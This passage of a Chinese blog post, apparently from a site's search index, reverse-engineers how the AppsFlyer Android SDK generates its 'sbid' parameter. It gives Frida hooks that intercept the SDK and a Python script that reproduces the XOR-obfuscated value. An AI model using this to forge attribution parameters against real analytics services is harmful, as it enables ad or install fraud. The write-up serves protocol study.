<li><p><strong>通过 <code>long parseLong = Long.parseLong(String.valueOf(map.get(((String) objArr[0]).intern())));</code> 获取这个值</strong></p>
<ul>
<li><p><code>((String) objArr[0]).intern()</code> 是一个解混淆后的字符串，它作为 Key 从 <code>map</code> 中取值。虽然我们无法直接看到解混淆后的结果，但根据 AppsFlyer 的工作机制，暂时猜测它是一个时间戳。</p>
</li>
<li><p>可以 hook <code>getRevenue()</code> 查看 <code>map</code>中的所有值从侧面验证一下</p>
<pre><code class="js">Java.perform(function () {
    let AFg1qSDK = Java.use("com.appsflyer.internal.AFg1qSDK");
    const JSONObject = Java.use('org.json.JSONObject');
    AFg1qSDK["getRevenue"].overload('java.util.Map', 'com.appsflyer.internal.AFd1nSDK').implementation = function (map, aFd1nSDK) {
        const json = JSONObject.$new(map);
        const mapContentAsString = json.toString(4);
        console.log(`AFg1qSDK.getRevenue is called: map=${mapContentAsString}, aFd1nSDK=${aFd1nSDK}`);
        this["getRevenue"](map, aFd1nSDK);
    };
});
</code></pre>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611104902875.png" class="" title="image-20250611104902875"></li>
</ul>
</li>
</ol>
</li>
<li><p>生成加密密钥(<code>i15</code>)</p>
<p><code>int i15 = ((int) (parseLong % 94)) + 33;</code></p>
<p>密钥的范围在 <em>33-126</em>，对应了 ASCII 表中的所有可见字符</p>
</li>
<li><p>逐字符进行异或加密，将 <code>charArray</code> 放入 <code>map</code></p>
<p>遍历原始字符串 (<code>str</code>) 的每一个字符，并与上一步生成的密钥 (<code>i15</code>) 进行异或操作</p>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611105602837.png" class="" title="image-20250611105602837">

<ul>
<li>循环遍历待加密字符串中的每个字符</li>
<li>加密后的字符 = 原始字符 ^ 密钥</li>
<li>存入 <code>map</code> 中，键为 “sbid”</li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="模拟-sbid-生成"><a href="#模拟-sbid-生成" class="headerlink" title="模拟 sbid 生成"></a>模拟 <code>sbid</code> 生成</h2><p>分析了 <code>sbid</code>的生成规则之后我们可以很容易的来模拟这个过程，</p>
<blockquote>
<p><code>AFAdRevenueData </code>：是一个随机生成的 UUID 的前8位</p>
<p><code>parseLong </code>：是一个时间戳</p>
</blockquote>
<p>以Python为例实现如下：</p>
<pre><code class="python">import time
import uuid

def generate_session_id() -&gt; str:
    """
    步骤 1: 模拟生成 sbid 的明文。
    根据分析，这是通过截取 UUID 的前8位得到的。
    """
    # 生成一个随机的 UUID v4，并获取其32位的十六进制表示
    # 例如：'1e41d495a7c94379b99528b15d2c60de'
    hex_uuid = uuid.uuid4().hex
    
    # 截取前8个字符
    # 例如：'1e41d495'
    session_id = hex_uuid[:8]
    return session_id

def generate_sbid(session_id: str, timestamp_ms: int) -&gt; str:
    """
    步骤 2 &amp; 3: 使用会话ID和时间戳生成最终的 sbid。

    :param session_id: 8位的会话随机串 (从 generate_session_id() 获取)。
    :param timestamp_ms: 事件的毫秒级时间戳。
    :return: 生成的 sbid 字符串。
    """
    if not isinstance(session_id, str) or len(session_id) != 8:
        raise ValueError("session_id 必须是一个8位的字符串")
    if not isinstance(timestamp_ms, int):
        raise ValueError("timestamp_ms 必须是一个整数")

    # --- 步骤 2: 根据时间戳生成密钥 ---
    # Java code: int i15 = ((int) (parseLong % 94)) + 33;
    xor_key = (timestamp_ms % 94) + 33
    
    # --- 步骤 3: 对输入字符串的每个字符进行异或操作 ---
    # Java code: charArray[i13] = (char) (charArray[i13] ^ i15);
    encrypted_chars = []
    for char in session_id:
        # ord() 获取字符的 ASCII 值
        original_char_code = ord(char)
        # 执行异或操作
        encrypted_char_code = original_char_code ^ xor_key
        # chr() 将整数转回字符
        encrypted_chars.append(chr(encrypted_char_code))
        
    # 组合成最终的 sbid 字符串
    sbid = "".join(encrypted_chars)
    
    return sbid

# --- 完整流程模拟示例 ---
if __name__ == "__main__":
    print("--- 开始模拟 sbid 生成 ---")
    
    # 1. 为一次会话生成一个随机ID
    session_id_for_sbid = generate_session_id()
    print(f"步骤 1 - 生成的会话ID (明文): {session_id_for_sbid}")
    
    # 2. 获取事件的时间戳 (在实际应用中，这个时间戳需要和事件参数中的 af_timestamp 一致)
    event_timestamp_ms = int(time.time() * 1000)
    print(f"步骤 2 - 使用的事件时间戳:    {event_timestamp_ms}")
    
    # 3. 生成 sbid
    final_sbid = generate_sbid(session_id_for_sbid, event_timestamp_ms)
    print(f"步骤 3 - 生成的 sbid (密文):     {final_sbid}")
</code></pre>
<ul>
<li><p>执行结果</p>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611114313492.png" class="" title="image-20250611114313492"></li>
</ul>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><ol>
<li><p>使用 frida hook 获取app自身生成的参数和输出</p>
<pre><code class="js">Java.perform(function () {
    console.log("Frida script for sbid verification is running...");

    const AFg1qSDK = Java.use("com.appsflyer.internal.AFg1qSDK");
    const JClass = Java.use("java.lang.Class"); // 用于反射

    // Hook sbid 的核心生成方法
    AFg1qSDK.getRevenue
        .overload("java.util.Map", "com.appsflyer.internal.AFd1nSDK")
        .implementation = function (map, sdkInstance) {

            console.log("\n[+] Intercepted sbid generation call!");

            try {
                // --- 1. 抓取输入参数 (在原始方法执行前) ---

                // 输入1: 获取 sbid 的明文 (即 AFAdRevenueData 的值)
                const sdkClass = JClass.forName("com.appsflyer.internal.AFd1nSDK");
                const field = sdkClass.getDeclaredField("AFAdRevenueData");
                field.setAccessible(true);
                const plaintext_input = field.get(sdkInstance).toString();

                // 输入2: 从 map 中获取时间戳
                // AppsFlyer 通常使用 'af_timestamp' 作为 key
                const timestamp_key = "af_timestamp";
                const timestamp_obj = map.get(timestamp_key);
                let timestamp_ms_input = "Not Found";
                if (timestamp_obj) {
                    timestamp_ms_input = timestamp_obj.toString();
                }

                console.log("  &gt;&gt; INPUT 1 (Plaintext) : " + plaintext_input);
                console.log("  &gt;&gt; INPUT 2 (Timestamp) : " + timestamp_ms_input);

                // --- 2. 执行原始方法 ---
                // 让 App 正常生成 sbid
                const result = this.getRevenue(map, sdkInstance);

                // --- 3. 抓取输出结果 (在原始方法执行后) ---
                const sbid_key = "sbid";
                const real_sbid_output = map.get(sbid_key) ? map.get(sbid_key).toString() : "Not Found";
                console.log("  &lt;&lt; OUTPUT  (Actual sbid): " + real_sbid_output);
                console.log("-------------------------------------------------");

                return result;

            } catch (e) {
                console.error("Hook execution error:", e);
                this.getRevenue(map, sdkInstance);
            }
        };
});
</code></pre>
<ul>
<li><p>执行结果：</p>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611120205289.png" class="" title="image-20250611120205289"></li>
</ul>
</li>
<li><p>将参数代入我们的 Python 脚本进行结算看结果是否相同</p>
<pre><code class="python">import time
import uuid

def generate_session_id() -&gt; str:
    """
    步骤 1: 模拟生成 sbid 的明文。
    根据分析，这是通过截取 UUID 的前8位得到的。
    """
    # 生成一个随机的 UUID v4，并获取其32位的十六进制表示
    # 例如：'1e41d495a7c94379b99528b15d2c60de'
    hex_uuid = uuid.uuid4().hex
    
    # 截取前8个字符
    # 例如：'1e41d495'
    session_id = hex_uuid[:8]
    return session_id

def generate_sbid(session_id: str, timestamp_ms: int) -&gt; str:
    """
    步骤 2 &amp; 3: 使用会话ID和时间戳生成最终的 sbid。

    :param session_id: 8位的会话随机串 (从 generate_session_id() 获取)。
    :param timestamp_ms: 事件的毫秒级时间戳。
    :return: 生成的 sbid 字符串。
    """
    if not isinstance(session_id, str) or len(session_id) != 8:
        raise ValueError("session_id 必须是一个8位的字符串")
    if not isinstance(timestamp_ms, int):
        raise ValueError("timestamp_ms 必须是一个整数")

    # --- 步骤 2: 根据时间戳生成密钥 ---
    # Java code: int i15 = ((int) (parseLong % 94)) + 33;
    xor_key = (timestamp_ms % 94) + 33
    
    # --- 步骤 3: 对输入字符串的每个字符进行异或操作 ---
    # Java code: charArray[i13] = (char) (charArray[i13] ^ i15);
    encrypted_chars = []
    for char in session_id:
        # ord() 获取字符的 ASCII 值
        original_char_code = ord(char)
        # 执行异或操作
        encrypted_char_code = original_char_code ^ xor_key
        # chr() 将整数转回字符
        encrypted_chars.append(chr(encrypted_char_code))
        
    # 组合成最终的 sbid 字符串
    sbid = "".join(encrypted_chars)
    
    return sbid

# --- 完整流程模拟示例 ---
if __name__ == "__main__":
    # --- 将下面两个变量替换为 Frida 抓取到的值 ---

    # 从 Frida 的 "INPUT 1 (Plaintext)" 复制
    session_id_from_frida = "922722c3" 

    # 从 Frida 的 "INPUT 2 (Timestamp)" 复制
    event_timestamp_from_frida = 1749614464065

    # ----------------------------------------------

    print(f"--- 使用 Frida 抓取的数据进行本地模拟 ---")
    print(f"使用的会话ID: {session_id_from_frida}")
    print(f"使用的时间戳: {event_timestamp_from_frida}")

    # 使用抓取到的输入，运行我们的模拟算法
    simulated_sbid = generate_sbid(session_id_from_frida, event_timestamp_from_frida)

    print(f"Python 模拟生成的 sbid: {simulated_sbid}")
</code></pre>
<ul>
<li><p>执行结果：</p>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611120423343.png" class="" title="image-20250611120423343">

<ul>
<li>结果完全相同，证明了我们模拟的算法是正确的</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>frida-hook</tag>
        <tag>协议分析</tag>
        <tag>App逆向</tag>
        <tag>算法模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>到算法模拟</title>
    <url>/2025/06/11/%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
